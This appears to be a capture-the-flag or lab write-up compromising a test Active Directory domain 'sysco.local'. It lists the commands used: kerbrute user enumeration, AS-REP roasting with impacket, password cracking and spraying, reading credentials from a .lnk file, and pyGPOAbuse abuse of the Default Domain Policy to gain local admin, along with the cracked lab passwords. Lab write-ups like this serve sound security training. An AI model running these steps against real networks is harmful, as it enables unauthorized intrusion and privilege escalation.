We begin with no creds
nmap shows a webpage at port 80, that's all

On the webpage, we get some team members name. We note it down, generate usernames from names, and run kerbrute to validate the users.
We see one of the users is asrep-roastable, we get his hash, spray everywhere, but nothing.
Then kerberoast, bloodhound, certipy, nothing.
So we begin fuzzing the webpage, until we find a "roundcube" login page, where the user's creds work.
Here, we find an attachment, that has creds for lainey (verified by spraying), and lainey can winrm and rdp.
```zsh
python /opt/name_to_username/username_generator.py -w names.txt > usern.txt
./kerbrute userenum --dc 10.0.28.142 -d sysco.local usern.txt
#got jack.dowland, lainey.moore, greg.shields

impacket-GetNPUsers sysco.local/ -dc-ip 10.0.28.142 -usersfile users.txt -format john -outputfile hashes.txt -no-pass
#get jack, crack the hash as musicman1
#This works for roundcube login
#in recieved mail, we see a password hash for lainey.moore
#cracked as Chocolate1
#spray to find our she can rdp and winrm

#In her documents, we find a .lnk file we can cat it and read it, but
sudo apt install liblnk-utils
lnkinfo "Putty - HS Router login.lnk"
#We see password 5y5coSmarter2025!!!
#upon spraying, we find it belogs to greg.shields
#Bloodhound shows greg.shields has GenericAll on 'Default Domain Policy'
#This means we can use pyGPOAbuse to execute a system-level command. By default, it add a new user, 'John':'H4x00r123..', but we can make it run custom commands

python3 /opt/pyGPOAbuse/pyGPOAbuse/pygpoabuse.py -dc-ip 10.0.28.142 sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators greg.shields /add'

#now, winrm as greg.shields
gpupdate /force #or wait for 5 mins
#reloginto winrm as local admin greg.shields
```
